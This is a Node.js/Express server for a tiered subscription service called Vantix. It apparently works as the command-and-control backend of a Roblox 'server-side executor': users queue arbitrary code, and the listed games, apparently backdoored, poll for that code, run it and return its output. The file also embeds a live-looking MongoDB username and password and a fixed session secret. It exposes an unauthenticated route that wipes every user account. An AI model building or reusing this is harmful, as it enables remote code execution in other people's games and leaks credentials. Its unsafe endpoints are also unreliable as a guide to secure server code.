const express    = require("express");
const path       = require("path");
const bcrypt     = require("bcryptjs");
const session    = require("express-session");
const MongoStore = require("connect-mongo");
const mongoose   = require("mongoose");
const { v4: uuidv4 } = require("uuid");

const MONGO_URI = "mongodb+srv://VantixSS:IMBACKLOL@vantixss.kyskpmm.mongodb.net/vantix?appName=VantixSS&retryWrites=true&w=majority";

const userSchema = new mongoose.Schema({
    username: { type: String, required: true, unique: true },
    email:    { type: String, required: true, unique: true },
    password: { type: String, required: true },
    dob:      String,
    tier:     { type: String, default: "none" },
    joinedAt: { type: Date, default: Date.now }
});
const gameSchema = new mongoose.Schema({
    placeId:     { type: String, required: true, unique: true },
    name:        String,
    players:     { type: Number, default: 0 },
    creator:     String,
    icon:        String,
    earlyAccess: { type: Boolean, default: false },
    updated:     { type: Date, default: Date.now }
});
const tokenSchema = new mongoose.Schema({
    token:    { type: String, required: true, unique: true },
    username: String,
    placeId:  String,
    used:     { type: Boolean, default: false },
    createdAt:{ type: Date, default: Date.now, expires: 600 }
});
const commandSchema = new mongoose.Schema({
    id:          { type: String, required: true },
    placeId:     String,
    code:        String,
    status:      { type: String, default: "pending" },
    output:      String,
    requestedBy: String,
    ts:          { type: Date, default: Date.now, expires: 3600 }
});

const User    = mongoose.model("User",    userSchema);
const Game    = mongoose.model("Game",    gameSchema);
const Token   = mongoose.model("Token",   tokenSchema);
const Command = mongoose.model("Command", commandSchema);

const TIERS = {
    none:         { maxPlayers: 0        },
    bronze:       { maxPlayers: 10       },
    silver:       { maxPlayers: 80       },
    gold:         { maxPlayers: 100      },
    diamond:      { maxPlayers: 150      },
    platinum:     { maxPlayers: 500      },
    early_access: { maxPlayers: 0, earlyOnly: true },
    elite:        { maxPlayers: 1000     },
    absolute:     { maxPlayers: Infinity }
};

const OWNER = "dr.muffinn";

async function gamesForTier(tierKey) {
    const all = await Game.find({});
    if (tierKey === "absolute") return all;
    if (tierKey === "early_access") return all.filter(g => g.earlyAccess);
    const tier = TIERS[tierKey];
    if (!tier) return [];
    return all.filter(g => !g.earlyAccess && g.players < tier.maxPlayers);
}

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

mongoose.connect(MONGO_URI)
    .then(() => console.log("MongoDB connected"))
    .catch(e => { console.error("MongoDB failed:", e.message); process.exit(1); });

app.use(session({
    secret: "vantix-2024",
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({ mongoUrl: MONGO_URI }),
    cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

function requireLogin(req, res, next) {
    if (!req.session.username) return res.status(401).json({ ok: false, error: "Not logged in" });
    next();
}
function requireOwner(req, res, next) {
    if (req.session.username !== OWNER) return res.status(403).json({ ok: false, error: "Forbidden" });
    next();
}

// STATIC
app.get("/",          (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.get("/style.css", (req, res) => res.sendFile(path.join(__dirname, "style.css")));
app.get("/app.js",    (req, res) => res.sendFile(path.join(__dirname, "app.js")));

// RESET (remove after use)
app.get("/api/reset-users", async (req, res) => {
    await User.deleteMany({});
    res.json({ ok: true, message: "All users wiped." });
});

// SIGNUP
app.post("/api/signup", async (req, res) => {
    try {
        const { email, username, password, dob } = req.body;
        if (!email || !username || !password || !dob)
            return res.json({ ok: false, error: "All fields required" });

        const cleanEmail    = email.trim().toLowerCase();
        const cleanUsername = username.trim();

        const existingUser  = await User.findOne({ username: cleanUsername });
        const existingEmail = await User.findOne({ email: cleanEmail });
        if (existingUser)  return res.json({ ok: false, error: "Username already taken" });
        if (existingEmail) return res.json({ ok: false, error: "Email already in use" });

        const hash = await bcrypt.hash(password, 10);
        await User.create({ email: cleanEmail, username: cleanUsername, password: hash, dob, tier: "none" });

        res.json({ ok: true, username: cleanUsername });
    } catch (e) {
        console.error("Signup error:", e.message);
        if (e.code === 11000) {
            const field = Object.keys(e.keyPattern || {})[0];
            return res.json({ ok: false, error: field === "username" ? "Username already taken" : "Email already in use" });
        }
        res.json({ ok: false, error: "Signup failed: " + e.message });
    }
});

// LOGIN
app.post("/api/login", async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) return res.json({ ok: false, error: "All fields required" });
        const user = await User.findOne({ username: username.trim() });
        if (!user) return res.json({ ok: false, error: "Invalid username or password" });
        const match = await bcrypt.compare(password, user.password);
        if (!match) return res.json({ ok: false, error: "Invalid username or password" });
        req.session.username = user.username;
        req.session.save(() => res.json({ ok: true, username: user.username, tier: user.tier, isOwner: user.username === OWNER }));
    } catch (e) {
        console.error("Login error:", e.message);
        res.json({ ok: false, error: "Login failed: " + e.message });
    }
});

// LOGOUT
app.post("/api/logout", (req, res) => req.session.destroy(() => res.json({ ok: true })));

// ME
app.get("/api/me", async (req, res) => {
    if (!req.session.username) return res.json({ ok: false });
    try {
        const user = await User.findOne({ username: req.session.username });
        if (!user) return res.json({ ok: false });
        res.json({ ok: true, username: user.username, tier: user.tier, isOwner: user.username === OWNER });
    } catch { res.json({ ok: false }); }
});

// GAMES
app.get("/api/games", requireLogin, async (req, res) => {
    try {
        const user = await User.findOne({ username: req.session.username });
        res.json(await gamesForTier(user.tier));
    } catch { res.json([]); }
});

// JOIN TOKEN
app.post("/api/join", requireLogin, async (req, res) => {
    try {
        const { placeId } = req.body;
        if (!placeId) return res.json({ ok: false });
        const user    = await User.findOne({ username: req.session.username });
        const allowed = await gamesForTier(user.tier);
        if (!allowed.find(g => g.placeId === placeId))
            return res.json({ ok: false, error: "Your tier does not include this game" });
        const token = uuidv4();
        await Token.create({ token, username: user.username, placeId });
        res.json({ ok: true, token, placeId });
    } catch (e) { res.json({ ok: false, error: e.message }); }
});

// ROBLOX UPDATE
app.post("/api/update", async (req, res) => {
    try {
        const { placeId, players, name, creator, earlyAccess } = req.body;
        if (!placeId) return res.json({ ok: false });
        let icon = "";
        try {
            const r = await fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeId}&size=512x512&format=Png`);
            const d = await r.json();
            icon = d?.data?.[0]?.imageUrl || "";
        } catch {}
        await Game.findOneAndUpdate(
            { placeId },
            { placeId, players: Number(players) || 0, name: name || "Unknown", creator: creator || "Unknown", icon, earlyAccess: earlyAccess === true || earlyAccess === "true", updated: new Date() },
            { upsert: true, new: true }
        );
        res.json({ ok: true });
    } catch (e) { res.json({ ok: false }); }
});

// VALIDATE TOKEN
app.post("/api/validate-token", async (req, res) => {
    try {
        const { token, placeId } = req.body;
        if (!token || !placeId) return res.json({ ok: false });
        const t = await Token.findOne({ token, placeId, used: false });
        if (!t) return res.json({ ok: false });
        t.used = true;
        await t.save();
        res.json({ ok: true, username: t.username });
    } catch { res.json({ ok: false }); }
});

// EXECUTE
app.post("/api/execute", requireLogin, async (req, res) => {
    try {
        const { placeId, code } = req.body;
        if (!placeId || !code) return res.json({ ok: false });
        const id = uuidv4();
        await Command.create({ id, placeId, code, status: "pending", requestedBy: req.session.username });
        res.json({ ok: true, id });
    } catch { res.json({ ok: false }); }
});

app.get("/api/poll", async (req, res) => {
    try {
        const { placeId } = req.query;
        if (!placeId) return res.json({ commands: [] });
        const cmds = await Command.find({ placeId, status: "pending" });
        await Command.updateMany({ placeId, status: "pending" }, { status: "sent" });
        res.json({ commands: cmds.map(c => ({ id: c.id, code: c.code })) });
    } catch { res.json({ commands: [] }); }
});

app.post("/api/result", async (req, res) => {
    try {
        const { placeId, id, output } = req.body;
        if (!placeId || !id) return res.json({ ok: false });
        await Command.findOneAndUpdate({ id, placeId }, { status: "done", output: output || "(no output)" });
        res.json({ ok: true });
    } catch { res.json({ ok: false }); }
});

app.get("/api/result", requireLogin, async (req, res) => {
    try {
        const { placeId, id } = req.query;
        if (!placeId || !id) return res.json({ status: "unknown" });
        const cmd = await Command.findOne({ id, placeId });
        if (!cmd) return res.json({ status: "unknown" });
        res.json({ status: cmd.status, output: cmd.output });
    } catch { res.json({ status: "unknown" }); }
});

// OWNER
app.get("/api/owner/users", requireOwner, async (req, res) => {
    try {
        const list = await User.find({}, { password: 0 });
        res.json(list.map(u => ({ username: u.username, email: u.email, tier: u.tier, joinedAt: u.joinedAt })));
    } catch { res.json([]); }
});

app.post("/api/owner/set-tier", requireOwner, async (req, res) => {
    try {
        const { username, tier } = req.body;
        if (!TIERS[tier]) return res.json({ ok: false, error: "Invalid tier" });
        const user = await User.findOneAndUpdate({ username }, { tier });
        if (!user) return res.json({ ok: false, error: "User not found" });
        res.json({ ok: true });
    } catch { res.json({ ok: false }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Vantix running on port", PORT));
